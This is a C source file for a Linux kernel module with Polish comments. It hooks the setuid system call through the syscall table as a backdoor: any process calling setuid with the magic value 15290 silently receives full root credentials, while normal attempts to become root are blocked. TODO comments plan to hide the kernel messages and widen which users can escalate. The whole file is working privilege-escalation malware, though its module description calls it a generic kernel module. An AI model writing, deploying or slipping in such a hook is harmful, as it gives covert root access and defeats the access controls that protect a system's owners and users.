#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/module.h>
#include <linux/version.h>
#include <linux/vmalloc.h>
#include <linux/mm.h>
#include <linux/sched.h>
#include <linux/unistd.h>
#include <asm/unistd.h>
#include "asm/kernel.h"
// TODO : // wyłączyć komunikaty kernela dla pozostałych użytkowników
	// DOROBIĆ żeby można wybrać z jakich ID można podnosić uprawnienia na roota (np dla usług systemowych)

MODULE_AUTHOR("netcuter") ;
MODULE_DESCRIPTION("Modul jadra systemu linux x86") ;
MODULE_VERSION("0.1-beta");
MODULE_LICENSE("GPL") ;


void **tablica_wywolan_systemowych;

asmlinkage long (*originalna_setuid)(uid_t uid);

asmlinkage long wlasna_setuid(uid_t uid)
{
    char id_procesu_rodzica[8]="\0";
    int Id_procesu_rodzica=(int)current->parent->cred->uid;
    struct cred *nowy = prepare_creds(); //tworzymy wskaźnik na strukture cred (zawierającą m.in uid,suid,euid) będąca elementem task_struct
                                        //prepare_creds - przygotowuje nowy zestaw poswiadczen
    sprintf( id_procesu_rodzica, "%d", Id_procesu_rodzica );
    if (uid == 15290)
    {
        char komunikat[128]="Kernel : User o uid = \0";

        strcat(komunikat,id_procesu_rodzica);
        strcat(komunikat," pomyslnie zalogowal sie na konto root\n");
        printk(komunikat);

        nowy->uid = 0;
        nowy->suid = 0;
        nowy->euid = 0;
        nowy->fsuid = 0;
        nowy->gid = 0;
        nowy->sgid = 0;
        nowy->egid = 0;
        nowy->fsgid = 0;

        return commit_creds(nowy); // ta funkcja ustawia nowe poświadczenia na biezacy proces wywołujacy setuid()

    }
    else
    {
        if(uid==0)
        {
            char komunikat[128]="Kernel : proba logowania sie na konto root z uid = \0";

            strcat(komunikat,id_procesu_rodzica);
            strcat(komunikat,"\n");
            printk(komunikat);

            return EPERM; // (Operation not permitted)
        }
        else return originalna_setuid(uid);
    }


}




static int __init inicjalizacja_modulu(void)
{
    tablica_wywolan_systemowych = get_writable_sct(get_sys_call_table());
    if (!tablica_wywolan_systemowych)
        return -1;

    originalna_setuid = tablica_wywolan_systemowych[__NR_setuid32];
    tablica_wywolan_systemowych[__NR_setuid32] = wlasna_setuid;

    return 0;
}

static void __exit deinicjalizacja_modulu(void)
{
    tablica_wywolan_systemowych[__NR_setuid32] = originalna_setuid;
    release_virtual_mapping(tablica_wywolan_systemowych);


}

module_init(inicjalizacja_modulu);
module_exit(deinicjalizacja_modulu);

